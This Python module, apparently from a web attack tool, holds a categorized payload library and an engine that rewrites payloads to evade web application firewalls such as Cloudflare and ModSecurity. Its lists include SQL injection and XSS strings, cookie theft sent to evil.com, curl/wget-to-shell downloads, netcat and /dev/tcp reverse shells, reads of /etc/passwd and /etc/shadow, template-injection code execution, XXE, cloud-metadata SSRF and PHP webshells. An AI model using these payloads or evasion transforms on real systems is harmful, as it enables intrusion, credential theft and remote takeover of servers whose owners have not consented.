"""Payload库和变形引擎 - 内置常见攻击payload，支持一键变形绕过WAF。"""

import re
import base64
import urllib.parse
import random
import json
from typing import Dict, List, Any


PAYLOAD_LIBRARY = {
    "sqli": {
        "label": "SQL注入",
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT user(),version()--",
            "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1' OR SLEEP(5)--",
            "admin'--",
            "admin' #",
            "' UNION SELECT username,password FROM users--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND SUBSTRING(@@version,1,1)='5'--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
            "' OR ''='",
            "1' OR '1'='1' /*",
            "1) OR 1=1--",
            "-1' UNION SELECT 1,2,3,4,5--",
        ],
    },
    "xss": {
        "label": "XSS跨站脚本",
        "payloads": [
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<script>fetch('http://evil.com?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
            "<svg/onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<script>String.fromCharCode(97,108,101,114,116)(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "'\"><script>alert(1)</script>",
            "<a href=javascript:alert(1)>click</a>",
            "<form action=javascript:alert(1)><input type=submit>",
        ],
    },
    "rce": {
        "label": "命令执行",
        "payloads": [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; uname -a",
            "| uname -a",
            "; whoami",
            "| whoami",
            "; ls -la",
            "| ls -la",
            "; curl http://evil.com/shell.sh | bash",
            "| wget http://evil.com/shell.sh -O- | sh",
            "; nc -e /bin/bash 10.0.0.1 4444",
            "| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "; ping -c 3 10.0.0.1",
            "| ping -n 3 10.0.0.1",
            "$(curl http://evil.com/cmd|sh)",
            "`wget http://evil.com/cmd`",
            "; python3 -c 'import os;os.system(\"id\")'",
            "| perl -e 'exec \"/bin/sh\"'",
        ],
    },
    "lfi": {
        "label": "文件包含/读取",
        "payloads": [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "file:///etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/log/apache2/access.log",
            "/proc/version",
        ],
    },
    "ssti": {
        "label": "模板注入",
        "payloads": [
            "{{7*7}}",
            "{{7*'7'}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{%import os%}{{os.popen('id').read()}}",
        ],
    },
    "xxe": {
        "label": "XXE注入",
        "payloads": [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://10.0.0.1/evil.dtd\">]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]>",
            "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/shadow\">]><data>&file;</data>",
        ],
    },
    "ssrf": {
        "label": "SSRF",
        "payloads": [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:8080",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
            "http://127.0.0.1:22",
            "http://10.0.0.1",
            "http://192.168.1.1",
        ],
    },
    "dir_traversal": {
        "label": "敏感路径/目录",
        "payloads": [
            "/admin",
            "/admin/login",
            "/administrator",
            "/wp-admin",
            "/wp-login.php",
            "/wp-config.php.bak",
            "/phpmyadmin",
            "/.env",
            "/.git/config",
            "/.svn/entries",
            "/backup",
            "/backup.sql",
            "/db.sql",
            "/database.sql",
            "/config.php.bak",
            "/.DS_Store",
            "/server-status",
            "/actuator",
            "/actuator/env",
            "/swagger-ui.html",
            "/console",
            "/debug",
            "/test.php",
            "/phpinfo.php",
            "/info.php",
            "/robots.txt",
            "/sitemap.xml",
            "/crossdomain.xml",
        ],
    },
    "webshell": {
        "label": "Webshell连接",
        "payloads": [
            "<?php @eval($_POST['cmd']);?>",
            "<?php @assert($_POST['cmd']);?>",
            "<?php system($_GET['cmd']);?>",
            "<?php echo shell_exec($_GET['cmd']);?>",
            "<?=`$_GET[cmd]`?>",
        ],
    },
}


BYPASS_TECHNIQUES = {
    "cloudflare": {
        "label": "Cloudflare",
        "techniques": [
            {"name": "TLS指纹模拟", "desc": "使用curl_cffi/tls-client模拟Chrome TLS指纹，cf_clearance绑定TLS指纹", "transform": None},
            {"name": "大小写混合", "desc": "UnIoN SeLeCt 绕过关键字过滤", "transform": "case_random"},
            {"name": "内联注释", "desc": "UN/**/ION/**/SE/**/LECT 绕过空格和关键字过滤", "transform": "inline_comment"},
            {"name": "URL编码", "desc": "对特殊字符进行URL编码", "transform": "url_encode"},
            {"name": "双重URL编码", "desc": "双重编码绕过单次解码过滤", "transform": "double_url_encode"},
            {"name": "分块传输", "desc": "Transfer-Encoding: chunked 绕过WAF检测", "transform": None},
            {"name": "HPP参数污染", "desc": "id=1&id=UNION SELECT 绕过", "transform": None},
            {"name": "换行符分割", "desc": "使用%0a%0d分割关键字", "transform": "newline_split"},
        ],
    },
    "modsecurity": {
        "label": "ModSecurity/CRS",
        "techniques": [
            {"name": "大小写混合", "desc": "UnIoN SeLeCt", "transform": "case_random"},
            {"name": "内联注释", "desc": "UN/**/ION/**/SEL/**/ECT", "transform": "inline_comment"},
            {"name": "URL编码", "desc": "%27%20OR%201=1", "transform": "url_encode"},
            {"name": "双重编码", "desc": "%2527%2520OR%25201=1", "transform": "double_url_encode"},
            {"name": "Unicode编码", "desc": "使用Unicode全角字符替代", "transform": "unicode_encode"},
            {"name": "注释填充", "desc": "SELECT/*!12345UNION*/", "transform": "mysql_comment"},
            {"name": "Content-Type变换", "desc": "改用multipart/form-data", "transform": None},
            {"name": "HTTP方法变换", "desc": "GET改POST或PUT", "transform": None},
        ],
    },
    "generic": {
        "label": "通用绕过",
        "techniques": [
            {"name": "大小写混合", "desc": "随机大小写", "transform": "case_random"},
            {"name": "URL编码", "desc": "全量URL编码", "transform": "url_encode"},
            {"name": "双重URL编码", "desc": "双重编码", "transform": "double_url_encode"},
            {"name": "HTML实体编码", "desc": "HTML实体编码", "transform": "html_encode"},
            {"name": "Base64编码", "desc": "Base64编码", "transform": "base64_encode"},
            {"name": "内联注释", "desc": "/**/替代空格", "transform": "inline_comment"},
            {"name": "Tab替代空格", "desc": "使用%09替代空格", "transform": "tab_replace"},
            {"name": "换行分割", "desc": "%0a分割关键字", "transform": "newline_split"},
            {"name": "括号替代空格", "desc": "用括号替代空格", "transform": "paren_replace"},
            {"name": "反引号绕过", "desc": "MySQL反引号包裹关键字", "transform": None},
        ],
    },
}


def transform_case_random(payload: str) -> str:
    """随机大小写。"""
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)


def transform_url_encode(payload: str) -> str:
    """URL编码（保留字母数字和部分安全字符）。"""
    return urllib.parse.quote(payload, safe='')


def transform_double_url_encode(payload: str) -> str:
    """双重URL编码。"""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')


def transform_html_encode(payload: str) -> str:
    """HTML实体编码。"""
    result = []
    for c in payload:
        if c.isalnum() or c in ' .-_,':
            result.append(c)
        else:
            result.append(f'&#x{ord(c):x};')
    return ''.join(result)


def transform_base64_encode(payload: str) -> str:
    """Base64编码。"""
    return base64.b64encode(payload.encode()).decode()


def transform_inline_comment(payload: str) -> str:
    """用/**/替代空格。"""
    return re.sub(r'\s+', '/**/', payload)


def transform_tab_replace(payload: str) -> str:
    """用Tab(%09)替代所有空白字符。"""
    return re.sub(r'\s+', '%09', payload)


def transform_newline_split(payload: str) -> str:
    """在SQL关键字中插入换行符（%0a），绕过关键字过滤。"""
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'BY',
                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE', 'INTO', 'SET',
                'HAVING', 'GROUP', 'LIMIT', 'OFFSET', 'JOIN', 'LEFT', 'RIGHT',
                'INNER', 'OUTER', 'CROSS', 'NATURAL', 'ON', 'AS', 'IN', 'NOT',
                'NULL', 'IS', 'LIKE', 'BETWEEN', 'EXISTS', 'CASE', 'WHEN', 'THEN',
                'ELSE', 'END', 'DISTINCT', 'ALL', 'ANY', 'SOME', 'UNIQUE']
    result = payload
    for kw in keywords:
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        def split_kw(m):
            w = m.group(0)
            if len(w) >= 2:
                mid = max(1, len(w) // 2)
                return w[:mid] + '%0a' + w[mid:]
            return '%0a' + w
        result = pattern.sub(split_kw, result)
    return result


def transform_paren_replace(payload: str) -> str:
    """用括号替代空格（SQLi场景）。"""
    result = re.sub(r'\s+', ')(', payload)
    return result


def transform_unicode_encode(payload: str) -> str:
    """Unicode编码（针对关键字）。"""
    result = []
    for c in payload:
        if c.isalpha():
            result.append(f'\\u{ord(c):04x}')
        else:
            result.append(c)
    return ''.join(result)


TRANSFORMS = {
    "case_random": transform_case_random,
    "url_encode": transform_url_encode,
    "double_url_encode": transform_double_url_encode,
    "html_encode": transform_html_encode,
    "base64_encode": transform_base64_encode,
    "inline_comment": transform_inline_comment,
    "tab_replace": transform_tab_replace,
    "newline_split": transform_newline_split,
    "paren_replace": transform_paren_replace,
    "unicode_encode": transform_unicode_encode,
}


def apply_transform(payload: str, transform_name: str) -> str:
    """应用单个变形。"""
    fn = TRANSFORMS.get(transform_name)
    if fn:
        return fn(payload)
    return payload


def apply_all_transforms(payload: str) -> List[Dict[str, str]]:
    """对payload应用所有变形，返回 [{name, transformed}]。"""
    results = []
    for name, fn in TRANSFORMS.items():
        try:
            transformed = fn(payload)
            if transformed != payload:
                results.append({"name": name, "transformed": transformed})
        except Exception:
            continue
    return results


def get_payloads_by_category(category: str) -> List[str]:
    """获取指定类别的payload列表。"""
    cat = PAYLOAD_LIBRARY.get(category)
    return cat["payloads"] if cat else []


def get_all_categories() -> Dict[str, str]:
    """获取所有payload类别。"""
    return {k: v["label"] for k, v in PAYLOAD_LIBRARY.items()}


def get_bypass_techniques(waf_type: str = "generic") -> List[Dict]:
    """获取针对特定WAF的绕过技术。"""
    if waf_type in BYPASS_TECHNIQUES:
        return BYPASS_TECHNIQUES[waf_type]["techniques"]
    return BYPASS_TECHNIQUES["generic"]["techniques"]


def search_payloads(keyword: str) -> List[Dict]:
    """搜索payload库。"""
    results = []
    kw = keyword.lower()
    for cat_id, cat in PAYLOAD_LIBRARY.items():
        for p in cat["payloads"]:
            if kw in p.lower():
                results.append({"category": cat_id, "label": cat["label"], "payload": p})
    return results
